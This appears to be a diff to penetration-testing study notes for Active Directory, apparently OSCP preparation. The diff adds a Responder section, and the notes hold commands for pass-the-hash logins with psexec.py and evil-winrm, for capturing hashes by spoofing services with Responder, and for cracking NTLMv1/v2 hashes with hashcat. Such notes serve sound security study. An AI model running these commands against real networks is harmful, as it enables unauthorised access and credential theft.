@@ -1,6 +1,5 @@
 # Active Directory Exploitation  
 ## NTLM Authentication
-### Impacket Scripts 
 ### Impacket Scripts  
 psexec.py, smbexec.py, wmiexec.py   
 If you have creds for the backup account for domain controller: can dump all hashes    
@@ -17,6 +16,15 @@ Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't ne
 
     python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
     evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  
+### Responder 
+Responder is not allowed on the OSCP exam. Allows you to spoof various services then capture hashes from devices that try to authenticate to those.    
+Start responder:    
+
+     sudo responder.py -I eth0   #start on specified interface        
+Crack Hashes from responder:     
+
+    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
+    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)  
 
 ## Kerberos (Port 88)   
 Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
